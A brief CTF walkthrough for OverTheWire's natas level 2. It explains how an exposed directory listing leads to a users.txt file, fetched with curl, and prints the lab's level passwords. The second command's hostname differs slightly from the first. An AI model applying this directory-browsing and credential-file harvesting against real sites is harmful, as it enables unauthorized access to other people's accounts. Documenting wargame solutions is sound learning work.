---
date: '2026-02-15'
description: exploring directory traversal
draft: false
title: natas-2
weight: 3
---

| info | value                                      |
|:-----|-------------------------------------------:|
| user | `natas2`                                   |
| pass | `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`         |
| host | `http://natas2.natas.labs.overthewire.org` |

---

## explanation

it may seem like there's nothing important at first glance besides, but we can find a linked resource within the document

```html
<img src="files/pixel.png">
```

why not check out if we can traverse through the domain's structure?

```sh
curl http://natas2.natas.labs.overthewire.org/files/ \
-u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

make sure to append a trailing slash `/` to `files/`, otherwise curl would try to access a `files` file, which doesn't exit. the output may look a bit scuffed, but carefully reading through it, there's a server listing

> or pipe it into [w3m](https://w3m.sourceforge.net/): `.. | w3m -T text/html`

```html
<a href="/">Parent Directory</a>    <!-- navigating to the parent dir -->
<a href="pixel.png">pixel.png</a>   <!-- the ressource found on the document  prior -->
<a href="users.txt">users.txt</a>   <!-- users dir, which could contain useful info -->
```

obviously we are interested in the `users.txt` file

```sh
curl http://natas2.natas.overthewire.org/files/users.txt \
-u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

# natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
